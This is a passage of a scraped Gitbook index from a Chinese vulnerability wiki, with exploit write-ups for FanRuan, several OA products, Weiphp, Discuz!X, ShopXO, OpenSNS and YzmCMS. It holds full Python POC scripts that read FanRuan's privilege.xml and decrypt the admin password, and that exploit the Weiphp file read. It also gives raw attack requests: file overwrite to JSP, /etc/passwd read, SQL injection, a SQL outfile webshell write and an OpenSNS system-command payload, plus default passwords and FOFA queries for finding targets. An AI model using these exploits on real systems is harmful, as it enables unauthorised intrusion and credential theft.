javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; public class ChartGetFileContentAction extends ActionNoSessionCMD { public ChartGetFileContentAction() { } public void actionCMD(HttpServletRequest var1, HttpServletResponse var2, String var3) throws Exception { String var4 = CodeUtils.cjkDecode(WebUtils.getHTTPRequestParameter(var1, \"resourcepath\")); if (!WebUtils.invalidResourcePath(var4)) { InputStream var5 = FRContext.getCurrentEnv().readResource(var4); String var6 = IOUtils.inputStream2String(var5); var6 = var6.replace('\\ufeff', ' '); WebUtils.printAsString(var2, var6); } } public String getCMD() { return \"get_geo_json\"; } } 使用request将文件名传入 调用cjkDecode函数解密文件名 使用invalidResourcePath函数校验文件是否存在 最后使用readResource函数读取文件传输到浏览器上 默认目录为resources 其中的privilege.xml里面存储了后台的用户名密码 [!NOTE] 加密函数 public static String passwordEncode(String var0) { StringBuilder var1 = new StringBuilder(); var1.append(\"___\"); if (var0 == null) { return var1.toString(); } else { int var2 = 0; for(int var3 = 0; var3 [!NOTE] 解密函数 public static String passwordDecode(String var0) { if (var0 != null && var0.startsWith(\"___\")) { var0 = var0.substring(3); StringBuilder var1 = new StringBuilder(); int var2 = 0; for(int var3 = 0; var3 使用python写出的解密代码为 cipher = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' #密文 PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23] #掩码 Password = \"\" cipher = cipher[3:] #截断三位后 for i in range(int(len(cipher) / 4)): c1 = int(\"0x\" + cipher[i * 4:(i + 1) * 4], 16) c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8] Password = Password + chr(c2) print (Password) 这里使用上面讲述的原理进行复现,访问目标 [!NOTE] 路径分为两种 /WebReport/ReportServer ReportServer 访问POC为,读取密码文件 privilege.xml /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml 使用解密脚本解密文件 得到密码，即可登陆后台系统，账户为 admin 漏洞利用POC import requests import sys import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 帆软报表 v8.0 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def decode_passwd(cipher): PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23] # 掩码 Password = \"\" cipher = cipher[3:] # 截断三位后 for i in range(int(len(cipher) / 4)): c1 = int(\"0x\" + cipher[i * 4:(i + 1) * 4], 16) c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8] Password = Password + chr(c2) return Password def POC_1(target_url): vuln_url_1 = target_url + '/WebReport/ReportServer' vuln_url_2 = target_url + '/ReportServer' headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response_1 = requests.get(url=vuln_url_1, timeout=5, verify=False, headers=headers) response_2 = requests.get(url=vuln_url_2, timeout=5, verify=False, headers=headers) if \"部署页面\" in response_1.text: print(\"\\033[32m[o] 目标部署页面为: {} \\033[0m\".format(vuln_url_1)) POC_2(vuln_url_1) elif \"部署页面\" in response_2.text: print(\"\\033[32m[o] 目标部署页面为: {} \\033[0m\".format(vuln_url_2)) POC_2(vuln_url_2) else: print(\"\\033[31m[x] 目标漏洞无法利用 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 目标漏洞无法利用 {} \\033[0m\".format(e)) sys.exit(0) def POC_2(vuln_url_fileread): vuln_url = vuln_url_fileread + \"?op=chart&cmd=get_geo_json&resourcepath=privilege.xml\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, verify=False, timeout=5) print(\"\\033[32m[o] 正在访问: {} \\033[0m\".format(vuln_url)) if \"rootManagerPassword\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标存在漏洞,读取敏感文件 \\n{} \\033[0m\".format(response.text)) user_name = re.findall(r'', response.text) cipher = re.findall(r'', response.text) password = decode_passwd(cipher[0]) print(\"\\033[34m[o] 后台账户密码为:{} {} \\033[0m\".format(user_name[0], password)) else: print(\"\\033[31m[x] 目标 {}不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url)) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 FineReportv8.0_Arbitrary_file_read 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/帆软OA/帆软 V9 任意文件覆盖文件上传.html":{"url":"book/OA产品漏洞/帆软OA/帆软 V9 任意文件覆盖文件上传.html","title":"帆软 V9 任意文件覆盖文件上传","keywords":"","body":"帆软 V9 任意文件覆盖文件上传 漏洞描述 帆软 V9 存在任意文件覆盖，导致攻击者可以任意文件上传 漏洞影响 [!NOTE] 帆软 V9 漏洞复现 POST /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp HTTP/1.1 Host: 192.168.10.1 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=DE7874FC92F0852C84D38935247D947F; JSESSIONID=A240C26B17628D871BB74B7601482FDE Connection: close Content-Type:text/xml;charset=UTF-8 Content-Length: 74 {\"__CONTENT__\":\"\",\"__CHARSET__\":\"UTF-8\"} 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/帆软OA/帆软报表 2012 SSRF漏洞.html":{"url":"book/OA产品漏洞/帆软OA/帆软报表 2012 SSRF漏洞.html","title":"帆软报表 2012 SSRF漏洞","keywords":"","body":"帆软报表 2012 SSRF漏洞 漏洞描述 帆软报表 2012 存在信息泄露漏洞，通过访问特定的Url获取造成SSRF 漏洞影响 [!NOTE] 帆软报表 2012 FOFA [!NOTE] body=\"down.download?FM_SYS_ID\" 漏洞复现 漏洞验证Url为 /ReportServer?op=resource&resource=0m0m6k.dnslog.cn 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/帆软OA/帆软报表 2012 信息泄露漏洞.html":{"url":"book/OA产品漏洞/帆软OA/帆软报表 2012 信息泄露漏洞.html","title":"帆软报表 2012 信息泄露漏洞","keywords":"","body":"帆软报表 2012 信息泄露漏洞 漏洞描述 帆软报表 2012 存在信息泄露漏洞，通过访问特定的Url获取部分敏感信息 漏洞影响 [!NOTE] 帆软报表 2012 FOFA [!NOTE] body=\"down.download?FM_SYS_ID\" 漏洞复现 获取登录报表系统的IP http://xxx.xxx.xxx.xxx/ReportServer?op=fr_server&cmd=sc_visitstatehtml&showtoolbar=false 数据库信息泄露 http://xxx.xxx.xxx.xxx/ReportServer?op=fr_server&cmd=sc_getconnectioninfo 后台默认口令 admin/123456 /ReportServer?op=fr_auth&cmd=ah_login&_=new%20Date().getTime() 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/新点OA/":{"url":"book/OA产品漏洞/新点OA/","title":"新点OA","keywords":"","body":"新点OA 新点OA 敏感信息泄露漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/新点OA/新点OA 敏感信息泄露漏洞.html":{"url":"book/OA产品漏洞/新点OA/新点OA 敏感信息泄露漏洞.html","title":"新点OA 敏感信息泄露漏洞","keywords":"","body":"新点OA 敏感信息泄露漏洞 漏洞描述 新点OA 存在敏感信息泄露漏洞，访问特定的Url时可以获取所有用户的登录名信息，攻击者获取后可以进一步利用 漏洞影响 [!NOTE] 新点OA FOFA [!NOTE] app=\"新点OA\" 漏洞复现 构造的Url为 /ExcelExport/人员列表.xls 将会下载人员列表文件 通过获取的登录名登陆后台(默认密码11111) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/金蝶OA/":{"url":"book/OA产品漏洞/金蝶OA/","title":"金蝶OA","keywords":"","body":"稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/金蝶OA/金蝶OA server_file 目录遍历漏洞.html":{"url":"book/OA产品漏洞/金蝶OA/金蝶OA server_file 目录遍历漏洞.html","title":"金蝶OA server_file 目录遍历漏洞","keywords":"","body":"金蝶OA server_file 目录遍历漏洞 漏洞描述 金蝶OA server_file 存在目录遍历漏洞，攻击者通过目录遍历可以获取服务器敏感信息 漏洞影响 [!NOTE] 金蝶OA FOFA [!NOTE] app=\"Kingdee-EAS\" 漏洞复现 登录界面为 漏洞POC /appmonitor/protected/selector/server_file/files?folder=/&suffix= Windows服务器 appmonitor/protected/selector/server_file/files?folder=C://&suffix= Linux服务器 appmonitor/protected/selector/server_file/files?folder=/&suffix= 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/启莱OA/":{"url":"book/OA产品漏洞/启莱OA/","title":"启莱OA","keywords":"","body":"启莱OA 启莱OA messageurl.aspx SQL注入漏洞 启莱OA treelist.aspx SQL注入漏洞 启莱OA CloseMsg.aspx SQL注入漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/启莱OA/启莱OA messageurl.aspx SQL注入漏洞.html":{"url":"book/OA产品漏洞/启莱OA/启莱OA messageurl.aspx SQL注入漏洞.html","title":"启莱OA messageurl.aspx SQL注入漏洞","keywords":"","body":"启莱OA messageurl.aspx SQL注入漏洞 漏洞描述 启莱OA messageurl.aspx文件存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息 漏洞影响 [!NOTE] 启莱OA FOFA [!NOTE] app=\"启莱OA\" 漏洞复现 登录页面如下 存在SQL注入的文件为 messageurl.aspx http://xxx.xxx.xxx.xxx/client/messageurl.aspx?user=' and (select db_name())>0--&pwd=1 使用SQLmap对参数 user 进行注入 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/启莱OA/启莱OA treelist.aspx SQL注入漏洞.html":{"url":"book/OA产品漏洞/启莱OA/启莱OA treelist.aspx SQL注入漏洞.html","title":"启莱OA treelist.aspx SQL注入漏洞","keywords":"","body":"启莱OA treelist.aspx SQL注入漏洞 漏洞描述 启莱OA treelist.aspx文件存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息 漏洞影响 [!NOTE] 启莱OA FOFA [!NOTE] app=\"启莱OA\" 漏洞复现 登录页面如下 存在SQL注入的文件为 treelist.aspx http://xxx.xxx.xxx.xxx/client/treelist.aspx?user=' and (select db_name())>0--&pwd=1 使用SQLmap对参数 user 进行注入 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/启莱OA/启莱OA CloseMsg.aspx SQL注入漏洞.html":{"url":"book/OA产品漏洞/启莱OA/启莱OA CloseMsg.aspx SQL注入漏洞.html","title":"启莱OA CloseMsg.aspx SQL注入漏洞","keywords":"","body":"启莱OA CloseMsg.aspx SQL注入漏洞 漏洞描述 启莱OA CloseMsg.aspx文件存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息 漏洞影响 [!NOTE] 启莱OA FOFA [!NOTE] app=\"启莱OA\" 漏洞复现 登录页面如下 存在SQL注入的文件为 CloseMsg.aspx http://xxx.xxx.xxx.xxx/client/CloseMsg.aspx?user=' and (select db_name())>0--&pwd=1 使用SQLmap对参数 user 进行注入 Goby & POC 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/":{"url":"book/CMS漏洞/","title":"CMS漏洞","keywords":"","body":"CMS 漏洞🦅 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/Weiphp/":{"url":"book/CMS漏洞/Weiphp/","title":"Weiphp","keywords":"","body":"Weiphp Weiphp5.0 前台文件任意读取 CNVD-2020-68596 Weiphp5.0 任意用户Cookie伪造 CNVD-2021-09693 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/Weiphp/Weiphp5.0 前台文件任意读取 CNVD-2020-68596.html":{"url":"book/CMS漏洞/Weiphp/Weiphp5.0 前台文件任意读取 CNVD-2020-68596.html","title":"Weiphp5.0 前台文件任意读取 CNVD-2020-68596","keywords":"","body":"Weiphp5.0 前台文件任意读取 CNVD-2020-68596 漏洞描述 Weiphp5.0 存在前台文件任意读取漏洞，可以读取数据库配置等敏感文件 影响版本 [!NOTE] Weiphp 环境搭建 weiphp5.0官方下载参考手册 参考官方手册创建网站即可 FOFA [!NOTE] app=\"WeiPHP\" 漏洞复现 漏洞函数文件:application\\material\\controller\\Material.php 漏洞函数:_download_imgage public function _download_imgage($media_id, $picUrl = '', $dd = null) { $savePath = SITE_PATH . '/public/uploads/picture/' . time_format(NOW_TIME, 'Y-m-d'); mkdirs($savePath); $cover_id = 0; if (empty($picUrl)) { // 获取图片URL $url = 'https://api.weixin.qq.com/cgi-bin/material/get_material?access_token=' . get_access_token(); $param['media_id'] = $media_id; // dump($url); $picContent = post_data($url, $param, 'json', false); $picjson = json_decode($picContent, true); // dump($picjson);die; if (isset($picjson['errcode']) && $picjson['errcode'] != 0) { $cover_id = do_down_image($media_id, $dd['thumb_url']); if (!$cover_id) { return 0; exit(); } } $picName = NOW_TIME . uniqid() . '.jpg'; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $picContent); } else { $content = wp_file_get_contents($picUrl); // 获取图片扩展名 $picExt = substr($picUrl, strrpos($picUrl, '=') + 1); if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) { $picExt = 'jpg'; } $picName = NOW_TIME . uniqid() . '.' . $picExt; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $content); if (!$res) { $cover_id = do_down_image($media_id); if (!$cover_id) { return 0; exit(); } } } if ($res) { $file = array( 'name' => $picName, 'type' => 'application/octet-stream', 'tmp_name' => $picPath, 'size' => $res, 'error' => 0 ); $File = D('home/Picture'); $cover_id = $File->addFile($file); } return $cover_id; } 首先注意到函数的标识为public，也就是这个函数是公共调用的，并且变量picUrl为可控变量 根据代码从上向下分析 $savePath = SITE_PATH . '/public/uploads/picture/' . time_format(NOW_TIME, 'Y-m-d'); 变量$savePath确定文件上传后的缓存位置为/public/uploads/picture/，并按照年-月-日 创建文件夹 向下对变量$picUrl 是否为空进行判断，并判断是否进行登录，这里使用POST传参进行验证登录绕过，跳转到else语句下 else { $content = wp_file_get_contents($picUrl); // 获取图片扩展名 $picExt = substr($picUrl, strrpos($picUrl, '=') + 1); if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) { $picExt = 'jpg'; } $picName = NOW_TIME . uniqid() . '.' . $picExt; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $content); if (!$res) { $cover_id = do_down_image($media_id); if (!$cover_id) { return 0; exit(); } } 分析传入变量 picUrl 的 wp_file_get_contents方法 $content = wp_file_get_contents($picUrl); 函数文件位置 application\\common.php 可以看到这里没有对我们的参数进行过滤，只做了一个有关超时的操作, 回到函数继续向下分析 $picExt = substr($picUrl, strrpos($picUrl, '=') + 1); if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) { $picExt = 'jpg'; } $picName = NOW_TIME . uniqid() . '.' . $picExt; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $content); 这里创建了有关当前时间的图片文件，并写入文件夹/public/uploads/picture/ 下 我们先尝试控制变量 $picUrl 来写入数据库配置文件到图片中 /public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php 查看目录/public/uploads/picture/，并用记事本打开写入的jpg文件 得到数据库配置文件的信息，既然这个变量可控，我们也可以通过这个方法下载木马文件，再通过解析漏洞或者文件包含等其他漏洞来getshell 在当前条件下并不知道文件名是什么，所以回到代码中继续寻找可以获取文件名的办法 if ($res) { $file = array( 'name' => $picName, 'type' => 'application/octet-stream', 'tmp_name' => $picPath, 'size' => $res, 'error' => 0 ); $File = D('home/Picture'); $cover_id = $File->addFile($file); } 向下跟进 addFile 函数 函数位置:application\\home\\model\\Picture.php function addFile($file) { $data['md5'] = md5_file($file['tmp_name']); $id = $this->where('md5', $data['md5'])->value('id'); if ($id > 0) { return $id; } $info = pathinfo($file['tmp_name']); $data['path'] = str_replace(SITE_PATH . '/public', '', $file['tmp_name']); $data['sha1'] = hash_file('sha1', $file['tmp_name']); $data['create_time'] = NOW_TIME; $data['status'] = 1; $data['wpid'] = get_wpid(); $id = $this->insertGetId($data); return $id; } 可以看到这部分代码写入了 Picture 表中 $id = $this->insertGetId($data); 我们查看一下数据库的这个数据表，可以发现之前所上传的数据全部缓存在这个表里了 我们现在则需要找到不需要登录的地方来获得这些数据，所以可以全局去查找调用了这个 Picture 表的地方 找到一处可以利用的地方 function user_pics() { $map['wpid'] = get_wpid(); $picList = M('Picture')->where(wp_where($map)) ->order('id desc') ->select(); $this->assign('picList', $picList); exit($this->fetch()); } 跟进 get_wpid 函数 function get_wpid($wpid = '') { if (defined('WPID')) { return WPID; } else { return 0; } } 查看 WPID 的定义，文件位置在config\\weiphp_define.php 定义值默认为 1，所以这里调用则可以获得数据库中Pictrue表的内容，间接的知道了文件内容以及文件名 访问地址: http://webphp/public/index.php/home/file/user_pids 可以看到文件名，根据url地址访问选择下载即可 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import random import re def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') \\033[0m') print('+ \\033[34mVersion: Weiphp5.0 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): upload_url = target_url + \"/public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } data = { \"1\":1 } try: response = requests.post(url=upload_url, headers=headers, data=data, timeout=20) if response.status_code == 200: print(\"\\033[32m[o] 成功将 database.php文件 写入Pictrue表中\\033[0m\") else: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") except: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") def POC_2(target_url): vnln_url = target_url + \"/public/index.php/home/file/user_pics\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.get(url=vnln_url, headers=headers).text href = re.findall(r'>> \\033[0m\")) POC_1(target_url) image_url = POC_2(target_url) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/Weiphp/Weiphp5.0 任意用户Cookie伪造 CNVD-2021-09693.html":{"url":"book/CMS漏洞/Weiphp/Weiphp5.0 任意用户Cookie伪造 CNVD-2021-09693.html","title":"Weiphp5.0 任意用户Cookie伪造 CNVD-2021-09693","keywords":"","body":"Weiphp5.0 任意用户Cookie伪造 CNVD-2021-09693 漏洞描述 Weiphp5.0 存在管理员用户Cookie伪造，通过泄露的密钥数据，可利用加密方法来得到管理员的Cookie 影响版本 [!NOTE] Weiphp 环境搭建 weiphp5.0官方下载参考手册 参考官方手册创建网站即可 FOFA [!NOTE] app=\"WeiPHP\" 漏洞复现 首先需要得到数据库配置文件中的data_auth_key密钥 得到这个配置文件可参照上一篇Weiphp5.0 前台文件任意读取 'data_auth_key' => '+0SeoAC#YR,Jm&c?[PhUg9u;:Drd8Fj4q|XOkx*T' 全局查找下使用了这个密钥的地方 找到了跟据这个密钥的加密方法和解密方法 加密方法 think_encrypt function think_encrypt($data, $key = '', $expire = 0) { $key = md5(empty($key) ? config('database.data_auth_key') : $key); $data = base64_encode($data); $x = 0; $len = strlen($data); $l = strlen($key); $char = ''; for ($i = 0; $i 解密方法 think_decrypt function think_decrypt($data, $key = '') { $key = md5(empty($key) ? config('database.data_auth_key') : $key); $data = str_replace(array( '-', '_' ), array( '+', '/' ), $data); $mod4 = strlen($data) % 4; if ($mod4) { $data .= substr('====', $mod4); } $data = base64_decode($data); $expire = substr($data, 0, 10); $data = substr($data, 10); if ($expire > 0 && $expire 全局查看下使用了解密方法的地方 在文件 application\\common.php 中含有使用解密方法的代码，用于做身份验证 function is_login() { $user = session('user_auth'); if (empty($user)) { $cookie_uid = cookie('user_id'); if (!empty($cookie_uid)) { $uid = think_decrypt($cookie_uid); $userinfo = getUserInfo($uid); D('common/User')->autoLogin($userinfo); $user = session('user_auth'); } } if (empty($user)) { return 0; } else { return session('user_auth_sign') == data_auth_sign($user) ? $user['uid'] : 0; } } 根据这里得到的代码，可以知道当user_Id=1时,会解密密钥后判断是否正确，如果正确则可以登录系统 我们在本地使用加密代码加密user_id=1得到的cookie则可以登录系统 添加cookie: user_id=xxxxxxxx即可成功登录 [!NOTE] 获取密钥的方法参照上一篇审计文章 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/Discuz!X/":{"url":"book/CMS漏洞/Discuz!X/","title":"Discuz!X","keywords":"","body":"Discuz!X Discuz!X 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/Discuz!X/Discuz!X 小于3.4 R20191201 后台SQL注入漏洞.html":{"url":"book/CMS漏洞/Discuz!X/Discuz!X 小于3.4 R20191201 后台SQL注入漏洞.html","title":"Discuz!X <3.4 R20191201 后台SQL注入漏洞","keywords":"","body":"Discuz!X 漏洞描述 不久以前Discuz!X的后台披露了一个sql注入的漏洞，这里也要感谢漏洞的发现和研究者（无糖的kn1f3)。 影响版本 [!NOTE] Discuz!X 环境搭建 百度云盘下载链接 密码: 0515 将 upload目录下的文件拷入phpstudy下的WWW目录打开网站按照步骤安装就行了 漏洞复现 来到后台页面, 在 UCenter 应用 ID 位置的参数添加单引号并抓包 发现出现SQL语句报错 使用报错注入去获取版本号 这里的参数为 settingnew[uc][appid] 查看文件 \\source\\admincp\\admincp_setting.php， 在2677行找到了输入点 根据报错语句找到SQL语句执行点，在文件uc_client\\model\\base.php 中的 206行 通过这里的语句可以看到我们可以使用 union注入 的方法来写入恶意文件(secure_file_priv不能为Null) 1' union select \"\" into outfile 'D:/test.php';--+ 也可以使用其他的方法 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/ShopXO/":{"url":"book/CMS漏洞/ShopXO/","title":"ShopXO","keywords":"","body":"ShopXO ShopXO download 任意文件读取漏洞 CNVD-2021-15822 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/ShopXO/ShopXO download 任意文件读取漏洞 CNVD-2021-15822.html":{"url":"book/CMS漏洞/ShopXO/ShopXO download 任意文件读取漏洞 CNVD-2021-15822.html","title":"ShopXO download 任意文件读取漏洞 CNVD-2021-15822","keywords":"","body":"ShopXO download 任意文件读取漏洞 CNVD-2021-15822 漏洞描述 ShopXO是一套开源的企业级开源电子商务系统。ShopXO存在任意文件读取漏洞，攻击者可利用该漏洞获取敏感信息 漏洞影响 [!NOTE] ShopXO FOFA [!NOTE] app=\"ShopXO企业级B2C电商系统提供商\" 漏洞复现 商城主页如下 发送漏洞请求包 GET /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q= HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 其中 /url/xxxx 中的 base64 解码后为 /etc/passwd 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/OpenSNS/":{"url":"book/CMS漏洞/OpenSNS/","title":"OpenSNS","keywords":"","body":"OpenSNS OpenSNS shareBox 远程命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/OpenSNS/OpenSNS shareBox 远程命令执行漏洞.html":{"url":"book/CMS漏洞/OpenSNS/OpenSNS shareBox 远程命令执行漏洞.html","title":"OpenSNS shareBox 远程命令执行漏洞","keywords":"","body":"OpenSNS shareBox 远程命令执行漏洞 漏洞描述 OpenSNS 存在远程命令执行漏洞，攻击者通过漏洞发送特定的请求包可以执行任意命令 漏洞影响 [!NOTE] OpenSNS FOFA [!NOTE] icon_hash=\"1167011145\" 漏洞复现 登录页面如下 发送Payload /index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(ver) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/Typesetter/":{"url":"book/CMS漏洞/Typesetter/","title":"Typesetter","keywords":"","body":"Typesetter Typesetter CMS 5-5.1 任意文件上传 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/Typesetter/Typesetter CMS 5-5.1 任意文件上传.html":{"url":"book/CMS漏洞/Typesetter/Typesetter CMS 5-5.1 任意文件上传.html","title":"Typesetter CMS 5-5.1 任意文件上传","keywords":"","body":"Typesetter CMS 5-5.1 任意文件上传 漏洞描述 可以通过将.php放在.zip文件中并解压缩来绕过对.php文件的保护。一旦完成，就可以使用恶意的php文件（webshell）在计算机上执行命令 影响版本 [!NOTE] Typesetter CMS 5-5.1 漏洞复现 按如下步骤复现 参考文章 Github 绕过文件上传限制导致命令执行 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/YzmCMS/":{"url":"book/CMS漏洞/YzmCMS/","title":"YzmCMS","keywords":"","body":"YzmCMS YzmCMS Version 小于V5.8正式版 后台采集模块 SSRF漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/YzmCMS/YzmCMS Version  小于V5.8正式版 后台采集模块 SSRF漏洞.html":{"url":"book/CMS漏洞/YzmCMS/YzmCMS Version  小于V5.8正式版 后台采集模块 SSRF漏洞.html","title":"YzmCMS Version  小于V5.8正式版 后台采集模块 SSRF漏洞","keywords":"","body":"YzmCMS version 漏洞描述 YzmCMS内容管理系统是一款轻量级开源内容管理系统，它采用自主研发的框架YZMPHP开发。程序基于PHP+Mysql架构，并采用MVC框架式开发的一款高效开源的内容管理系统，可运行在Linux、Windows、MacOSX、Solaris等各种平台上。 源码存在协议识别的缺陷，导致存在SSRF漏洞 漏洞影响 [!NOTE] YzmCMS version 环境搭建 https://github.com/yzmcms/yzmcms 按照文档安装即可 漏洞复现 登录后台 --> 模块管理 --> 采集管理 添加采集规则 在你的服务器上编辑HTML代码 [!NOTE] 根目录可能不同，payload需要更改 点击采集读取根目录下的 Flag 出现漏洞的代码位置 yzmcms/yzmphp/core/class/cache_factory.class.php 这里调用 url_check 函数 可以看到这里只检测了前4位是否为 http，使用 httpxxx 即可绕过 参考文章 There are SSRF vulnerabilities in background collection management 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/ezEIP/":{"url":"book/CMS漏洞/ezEIP/","title":"ezEIP","keywords":"","body":"ezEIP ezEIP 4.1.0 信息泄露漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/ezEIP/ezEIP 4.1.0 信息泄露漏洞.html":{"url":"book/CMS漏洞/ezEIP/ezEIP 4.1.0 信息泄露漏洞.html","title":"ezEIP 4.1.0 